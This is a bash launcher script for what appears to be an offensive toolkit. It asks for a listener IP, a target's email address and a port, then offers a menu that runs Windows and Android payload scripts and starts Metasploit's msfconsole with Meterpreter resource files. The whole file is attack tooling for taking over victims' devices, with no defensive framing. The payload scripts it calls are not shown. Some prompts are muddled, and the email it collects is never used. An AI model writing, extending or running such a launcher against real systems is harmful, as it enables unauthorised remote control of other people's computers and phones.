#!/bin/bash

validate_email() {
    email_regex='^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$'
    if [[ $1 =~ $email_regex ]]; then
        return 0
    else
        return 1
    fi
}

validate_ip() {
    ip_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    if [[ $1 =~ $ip_regex ]]; then
        return 0
    else
        return 1
    fi
}

echo "Enter the IP address that the target wants to listen:"
read ip_input

if ! validate_ip "$ip_input"; then
    echo "Please enter a valid IP address."
    exit 1
fi

echo "Enter the target's system mail address:"
read email_input

if ! validate_email "$email_input"; then
    echo "Please enter a valid email address."
    exit 1
fi

echo "Enter the port you want to listen:"
read port_input

echo "Email: $email_input"
echo "IP Address: $ip_input"
echo "Port: $port_input"

while true; do

  echo "Enter 1 to execute windows payload"
  echo "Enter 2 to run meterpreter hack for windows"
  echo "Enter 3 to execute android payload"
  echo "Enter 4 to run meterpreter hack for android"
  echo "Enter q to quit"
  read user_input

  if [ "$user_input" -eq 1 ]; then
    ./exploits/ex_window.sh $ip_input $port_input

  elif [ "$user_input" -eq 2 ]; then
    sudo msfconsole -r ./meterpreterhack_window.rc
 
  elif [ "$user_input" -eq 3 ]; then
   ./exploits/ex_android.sh $ip_input $port_input

  elif [ "$user_input" -eq 4 ]; then
   sudo msfconsole -r ./meterpreterhack_android.rc

  elif [ "$user_input" = "q" ]; then
    break

  else
   echo "Enter a valid option"

  fi

done

echo "Came out of loop"
